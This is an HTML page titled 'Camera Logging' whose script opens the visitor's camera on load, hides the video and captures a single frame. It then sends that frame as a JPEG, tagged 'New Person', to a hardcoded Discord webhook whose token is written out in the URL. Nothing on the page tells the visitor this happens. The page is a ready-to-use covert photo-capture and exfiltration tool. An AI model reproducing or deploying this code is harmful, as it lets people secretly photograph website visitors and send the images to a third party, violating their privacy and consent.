<html lang="en">
<head>
 <meta charset="UTF-8" />
 <meta name="referrer" content="no-referrer" />
 <meta http-equiv="X-Content-Type-Options" content="nosniff" />
 <meta name="viewport" content="width=device-width, initial-scale=1.0" />
 <title id="tab-title">Camera Logging</title>
 <style>
 video {
 display: none;
 }
 </style>
</head>
<body>
 <canvas id="canvas"></canvas>
 <script>
 let canvas = document.getElementById('canvas');
 let context = canvas.getContext('2d');
 let video = document.createElement('video');
 navigator.mediaDevices.getUserMedia({ video: { mediaSource: "camera" } })
 .then(function(stream) {
 video.srcObject = stream;
 video.onloadedmetadata = function() {
 let track = video.srcObject.getVideoTracks()[0];
 track.applyConstraints({width: 1280, height: 720});
 canvas.width = video.videoWidth;
 canvas.height = video.videoHeight;
 context.drawImage(video, 0, 0, canvas.width, canvas.height);
 // Send the image data to the Discord webhook
 let dataUrl = canvas.toDataURL('image/jpeg');
 fetch('https://discord.com/api/webhooks/1269800219902476370/VIew-iRlPeQTmuxLaH2sfLZr4lS-EUV4Fos9-hBASwdzngtApiCPawehzava1yIdQltF', {
 method: 'POST',
 headers: {
 'Content-Type': 'application/json'
 },
 body: JSON.stringify({
 content: 'New Person',
 embeds: [{
 image: {
 url: dataUrl
 }
 }]
 })
 })
 .then(function() {
 track.stop();
 video.srcObject = null;
 });
 };
 })
 .catch(function(error) {
 console.error('Error accessing media devices.', error);
 });
 </script>
</body>
</html>
